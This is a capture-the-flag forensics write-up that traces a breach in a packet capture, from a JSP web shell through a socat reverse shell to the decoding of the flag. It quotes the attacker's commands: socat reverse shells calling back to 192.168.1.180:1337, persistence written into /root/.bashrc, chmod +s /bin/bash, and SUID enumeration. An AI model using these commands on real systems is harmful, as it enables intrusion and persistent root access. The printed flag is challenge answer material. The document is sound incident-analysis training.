# Forensics 1: Wrong Spooky Season
> "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.


#### Difficulty: easy

We are given a zip file that contains `capture.pcap`. Opening it with Wireshark shows us about 505 lines.

Scrolling through the lines, we see some HTTP requests. As it's possible that there are some traces in the assets, I exported them using Wireshark: `File -> Export Objects -> HTTP`.
In the export screen we can preview some sp00ky images but near the bottom we can see that there's an entry for `e4d1c32a56ca15b3.jsp%3fcmd=whoami`. 

Suspecting that it may have been cut off, I exited the dialog and applied an `http` filter. Now we can more clearly see the suspicious lines:

```
426	36.907155	192.168.1.180	192.168.1.166	HTTP	242	GET /e4d1c32a56ca15b3.jsp?cmd=id HTTP/1.1 
428	36.910876	192.168.1.166	192.168.1.180	HTTP	2363	HTTP/1.1 200   (text/html)
436	47.456263	192.168.1.180	192.168.1.166	HTTP	266	GET /e4d1c32a56ca15b3.jsp?cmd=apt%20-y%20install%20socat HTTP/1.1 
456	49.374819	192.168.1.166	192.168.1.180	HTTP	4518	HTTP/1.1 200   (text/html)
464	63.222005	192.168.1.180	192.168.1.166	HTTP	282	GET /e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash HTTP/1.1 
```

Based on that last line, it seems like the network had been reverse shelled. I then applied a filter such that only packets going to 1337 were shown: `tcp.port == 1337`.
I then right-clicked on the first line and followed the TCP stream, which showed me the following


<details><summary>TCP Stream</summary>

```
id
uid=0(root) gid=0(root) groups=0(root)
groups
root
uname -r
5.18.0-kali7-amd64
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
ls -lha 
total 20K
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
-rwxrwx--- 1 root root 1.8K Oct  8 00:04 pom.xml
drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target
```
</details>


From here we can see the reversed base64 payload, which I reversed back and decoded, giving me the flag:

```
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```